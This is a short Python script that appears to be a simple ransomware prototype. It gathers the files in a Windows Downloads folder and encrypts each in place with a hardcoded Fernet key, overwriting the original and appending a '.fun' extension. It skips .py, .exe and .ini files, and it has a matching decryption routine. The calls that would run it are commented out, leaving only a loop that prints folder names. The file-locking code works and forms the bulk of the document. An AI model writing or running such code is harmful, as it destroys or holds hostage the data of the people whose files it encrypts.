import os
from cryptography.fernet import Fernet
from typing import Final

KEY: Final = b'171yM5aII7w0cM2C0EtD9yOlU71d4vooktwHOIsoZ6I='
files = []
path = "C:\\Users\\windows\\Downloads"

def getDecryptedFiles():
    for file in os.listdir(path):
        full_path = f"{path}\\{file}"
        if (file.__contains__(".fun") or file.__contains__(".py") or file.__contains__(".exe") or file.__contains__(".ini")):
            continue
        if(os.path.isfile(full_path)):
            files.append(full_path)

def getEencryptedFiles():
    for file in os.listdir(path):
        full_path = f"{path}\\{file}"
        if(file.__contains__(".fun")):
            files.append(full_path)

def encryptFiles():
    for file in files:
        with open(file, "rb") as binary_file:
            content = binary_file.read()
        encrypted_content = Fernet(KEY).encrypt(content)
        with open(file, "wb") as binary_file:
            binary_file.write(encrypted_content)
        os.rename(file, f"{file}.fun")

def decryptFiles():
    for file in files:
        with open(file, "rb") as binary_file:
            content = binary_file.read()
        decrypted_content = Fernet(KEY).decrypt(content)
        with open(file, "wb") as binary_file:
            binary_file.write(decrypted_content)
        os.rename(file, file.replace(".fun", ""))
  
# getDecryptedFiles ()
# encryptFiles()     
# getEencryptedFiles()
# decryptFiles()

for root, dirs, files in os.walk("C:\\Users\\windows\\Downloads"):
    for dir in dirs:
        print(dir)
        for file in files:
            pass
            # print(f"{root}\\{file}")
        